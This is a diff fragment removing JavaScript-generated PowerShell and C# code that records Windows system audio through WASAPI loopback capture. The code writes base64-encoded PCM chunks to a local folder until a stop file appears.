-'    $msg = ($_ | Out-String).Trim() -replace "[\\r\\n]+"," "\n' +
-'    if ($msg.Length -gt 300) { $msg = $msg.Substring(0,300) }\n' +
-'    Set-Content "$d\\header.txt" "ERROR:$msg" -Encoding ASCII\n' +
-'}\n'
-                        );
-                    }
-
-                    function buildCS() {
-                        return [
-'using System;',
-'using System.IO;',
-'using System.Runtime.InteropServices;',
-'using System.Threading;',
-'',
-'[ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]',
-'public interface IMMDeviceEnumerator {',
-'    void EnumAudioEndpoints(int dataFlow, int dwStateMask, out IntPtr ppDevices);',
-'    void GetDefaultAudioEndpoint(int dataFlow, int role, out IntPtr ppEndpoint);',
-'    void GetDevice([MarshalAs(UnmanagedType.LPWStr)] string pwstrId, out IntPtr ppDevice);',
-'    void RegisterEndpointNotificationCallback(IntPtr pClient);',
-'    void UnregisterEndpointNotificationCallback(IntPtr pClient);',
-'}',
-'[ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]',
-'public interface IMMDevice {',
-'    void Activate([MarshalAs(UnmanagedType.LPStruct)] Guid iid, int dwClsCtx, IntPtr pActivationParams, out IntPtr ppInterface);',
-'    void OpenPropertyStore(int stgmAccess, out IntPtr ppProperties);',
-'    void GetId([MarshalAs(UnmanagedType.LPWStr)] out string ppstrId);',
-'    void GetState(out int pdwState);',
-'}',
-'[ComImport, Guid("0BD7A1BE-7A1A-44DB-8397-CC5392387B5E"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]',
-'public interface IMMDeviceCollection {',
-'    void GetCount(out uint pcDevices);',
-'    void Item(uint nDevice, out IntPtr ppDevice);',
-'}',
-'[ComImport, Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]',
-'public interface IAudioClient {',
-'    void Initialize(int ShareMode, uint StreamFlags, long hnsBufferDuration, long hnsPeriodicity, ref WAVEFORMATEX pFormat, IntPtr AudioSessionGuid);',
-'    void GetBufferSize(out uint pNumBufferFrames);',
-'    void GetStreamLatency(out long phnsLatency);',
-'    void GetCurrentPadding(out uint pNumPaddingFrames);',
-'    void IsFormatSupported(int ShareMode, ref WAVEFORMATEX pFormat, out IntPtr ppClosestMatch);',
-'    void GetMixFormat(out IntPtr ppDeviceFormat);',
-'    void GetDevicePeriod(out long phnsDefaultDevicePeriod, out long phnsMinimumDevicePeriod);',
-'    void Start(); void Stop(); void Reset();',
-'    void SetEventHandle(IntPtr eventHandle);',
-'    void GetService([MarshalAs(UnmanagedType.LPStruct)] Guid riid, out IntPtr ppv);',
-'}',
-'[ComImport, Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]',
-'public interface IAudioCaptureClient {',
-'    void GetBuffer(out IntPtr ppData, out uint pNumFramesAvailable, out uint pdwFlags, out ulong pu64DevicePosition, out ulong pu64QPCPosition);',
-'    void ReleaseBuffer(uint NumFramesRead);',
-'    void GetNextPacketSize(out uint pNumFramesInNextPacket);',
-'}',
-'[StructLayout(LayoutKind.Sequential)]',
-'public struct WAVEFORMATEX {',
-'    public ushort wFormatTag, nChannels;',
-'    public uint   nSamplesPerSec, nAvgBytesPerSec;',
-'    public ushort nBlockAlign, wBitsPerSample, cbSize;',
-'}',
-'public static class WasapiCapture {',
-'    const uint LOOPBACK   = 0x00020000u;',
-'    const uint SILENT     = 0x00000002u;',
-'    const int  SHARED     = 0;',
-'    const int  CLSCTX_ALL = 23;',
-'    static readonly Guid IID_AC  = new Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");',
-'    static readonly Guid IID_ACC = new Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317");',
-'    [DllImport("ole32.dll")] static extern void CoInitialize(IntPtr reserved);',
-'',
-'    static IMMDevice GetDefaultDevice(IMMDeviceEnumerator en) {',
-'        try {',
-'            IntPtr p; en.GetDefaultAudioEndpoint(0, 0, out p);',
-'            var d = (IMMDevice)Marshal.GetObjectForIUnknown(p); Marshal.Release(p); return d;',
-'        } catch {}',
-'        IntPtr cp; en.EnumAudioEndpoints(0, 1, out cp);',
-'        var col = (IMMDeviceCollection)Marshal.GetObjectForIUnknown(cp); Marshal.Release(cp);',
-'        uint c; col.GetCount(out c);',
-'        if (c == 0) throw new Exception("No active render endpoints");',
-'        IntPtr dp; col.Item(0, out dp);',
-'        var dev = (IMMDevice)Marshal.GetObjectForIUnknown(dp); Marshal.Release(dp); return dev;',
-'    }',
-'',
-'    public static void Run(string dir) {',
-'        CoInitialize(IntPtr.Zero);',
-'        var stop = Path.Combine(dir, "stop.signal");',
-'        File.WriteAllText(Path.Combine(dir, "header.txt"), "STARTING:enum");',
-'        var enumType = Type.GetTypeFromCLSID(new Guid("BCDE0395-E52F-467C-8E3D-C4579291692E"), true);',
-'        var en       = (IMMDeviceEnumerator)Activator.CreateInstance(enumType);',
-'        File.WriteAllText(Path.Combine(dir, "header.txt"), "STARTING:device");',
-'        var dev = GetDefaultDevice(en);',
-'        File.WriteAllText(Path.Combine(dir, "header.txt"), "STARTING:activate");',
-'        IntPtr ap; dev.Activate(IID_AC, CLSCTX_ALL, IntPtr.Zero, out ap);',
-'        var ac = (IAudioClient)Marshal.GetObjectForIUnknown(ap); Marshal.Release(ap);',
-'        File.WriteAllText(Path.Combine(dir, "header.txt"), "STARTING:format");',
-'        IntPtr fp; ac.GetMixFormat(out fp);',
-'        var fmt = (WAVEFORMATEX)Marshal.PtrToStructure(fp, typeof(WAVEFORMATEX));',
-'        Marshal.FreeCoTaskMem(fp);',
-'        bool isFloat = (fmt.wFormatTag == 3 || fmt.wFormatTag == 0xFFFE);',
-'        int sr = (int)fmt.nSamplesPerSec;',
-'        int ch = fmt.nChannels;',
-'        File.WriteAllText(Path.Combine(dir, "header.txt"), "STARTING:init");',
-'        ac.Initialize(SHARED, LOOPBACK, 100 * 10000L, 0, ref fmt, IntPtr.Zero);',
-'        IntPtr scp; ac.GetService(IID_ACC, out scp);',
-'        var cc = (IAudioCaptureClient)Marshal.GetObjectForIUnknown(scp); Marshal.Release(scp);',
-'        File.WriteAllText(Path.Combine(dir, "header.txt"), "AUDIO:" + sr + ":" + ch + ":16");',
-'        ac.Start();',
-'        int bpf = ch * 2;',
-'        int tgt = sr * bpf / 20;',
-'        var ms  = new System.IO.MemoryStream();',
-'        int idx = 0;',
-'        byte[] floatBuf = null;',
-'        while (!File.Exists(stop)) {',
-'            Thread.Sleep(10);',
-'            uint ps2; cc.GetNextPacketSize(out ps2);',
-'            while (ps2 > 0) {',
-'                IntPtr dp; uint fr, fl; ulong dv, qv;',
-'                cc.GetBuffer(out dp, out fr, out fl, out dv, out qv);',
-'                int ob = (int)fr * bpf;',
-'                if (ob > 0) {',
-'                    var b = new byte[ob];',
-'                    if ((fl & SILENT) != 0) {',
-'                        Array.Clear(b, 0, ob);',
-'                    } else if (isFloat) {',
-'                        int tot = (int)(fr * (uint)ch);',
-'                        int sb  = tot * 4;',
-'                        if (floatBuf == null || floatBuf.Length < sb) floatBuf = new byte[sb];',
-'                        Marshal.Copy(dp, floatBuf, 0, sb);',
-'                        for (int i = 0; i < tot; i++) {',
-'                            float f = BitConverter.ToSingle(floatBuf, i * 4);',
-'                            short s = (short)Math.Max(-32768, Math.Min(32767, (int)(f * 32767)));',
-'                            b[i * 2]     = (byte)(s & 0xFF);',
-'                            b[i * 2 + 1] = (byte)((s >> 8) & 0xFF);',
-'                        }',
-'                    } else {',
-'                        Marshal.Copy(dp, b, 0, ob);',
-'                    }',
-'                    ms.Write(b, 0, ob);',
-'                }',
-'                cc.ReleaseBuffer(fr);',
-'                cc.GetNextPacketSize(out ps2);',
-'            }',
-'            if (ms.Length >= tgt) {',
-'                byte[] chunk = ms.ToArray(); ms.SetLength(0); ms.Position = 0;',
-'                string t  = Path.Combine(dir, "chunk_" + idx.ToString("D6") + ".b64.tmp");',
-'                string f2 = Path.Combine(dir, "chunk_" + idx.ToString("D6") + ".b64");',
-'                File.WriteAllText(t, Convert.ToBase64String(chunk));',
-'                File.Move(t, f2);',
-'                idx++;',
-'            }',
-'        }',
-'        ac.Stop();',
-'    }',
-'}'
-                        ].join('\n');
-                    }
 
                     return obj;
                 })();
